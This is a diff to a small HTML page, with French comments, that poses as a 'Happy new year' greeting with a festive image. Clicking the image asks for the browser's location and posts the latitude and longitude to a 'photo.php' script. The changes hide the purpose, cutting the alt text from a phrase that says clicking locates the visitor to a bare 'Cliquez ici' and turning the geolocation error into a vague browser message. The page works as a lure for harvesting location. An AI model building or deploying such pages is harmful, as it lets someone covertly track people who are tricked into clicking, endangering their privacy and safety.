@@ -5,31 +5,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Happy new year</title>
     <script>
-        // Fonction pour obtenir la g�olocalisation
+        // Fonction pour obtenir la geolocalisation
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(sendLocation, showError);
             } else {
-                alert("La g�olocalisation n'est pas support�e par ce navigateur.");
+                alert("probleme du navigateur.");
             }
         }
 
-        // Envoie la position au serveur via une requ�te POST
+        // Envoie la position au serveur via une requete POST
         function sendLocation(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
 
             // Affiche un message pour confirmer
-            alert('Position trouv�e ! Latitude: ' + latitude + ', Longitude: ' + longitude);
+            alert('Position trouvee ! Latitude: ' + latitude + ', Longitude: ' + longitude);
 
-            // Cr�e une requ�te pour envoyer les donn�es au serveur
+            // Cree une requete pour envoyer les donnees au serveur
             var xhr = new XMLHttpRequest();
             var url = "photo.php";  // Remplace par l'URL de ton script (PHP, Node.js, etc.)
             xhr.open("POST", url, true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.onreadystatechange = function () {
                 if (xhr.readyState == 4 && xhr.status == 200) {
-                    console.log(xhr.responseText);  // R�ponse du serveur (optionnel)
+                    console.log(xhr.responseText);  // Reponse du serveur (optionnel)
                 }
             };
             xhr.send("latitude=" + latitude + "&longitude=" + longitude);
@@ -56,10 +56,10 @@ function showError(error) {
 </head>
 <body>
 
-    <!-- L'image sur laquelle cliquer pour �tre localis� -->
-    <img src="https://img.freepik.com/photos-gratuite/fond-noel-mignon-bokeh_1361-3548.jpg?t=st=1735328349~exp=1735331949~hmac=2c11914ddbf1797858b622d7a88fee8682dc39549a5981aa8fc0705c88cfca5c&w=1380" alt="Cliquez ici pour �tre localis�" width="500px" onclick="getLocation()" style="cursor:pointer;">
+    <!-- L'image sur laquelle cliquer pour etre localise -->
+    <img src="https://img.freepik.com/photos-gratuite/fond-noel-mignon-bokeh_1361-3548.jpg?t=st=1735328349~exp=1735331949~hmac=2c11914ddbf1797858b622d7a88fee8682dc39549a5981aa8fc0705c88cfca5c&w=1380" alt="Cliquez ici" width="500px" onclick="getLocation()" style="cursor:pointer;">
     
-    <!-- Optionnel : Afficher les coordonn�es directement sur la page -->
+    <!-- Optionnel : Afficher les coordonnees directement sur la page -->
 
 </body>
 </html>
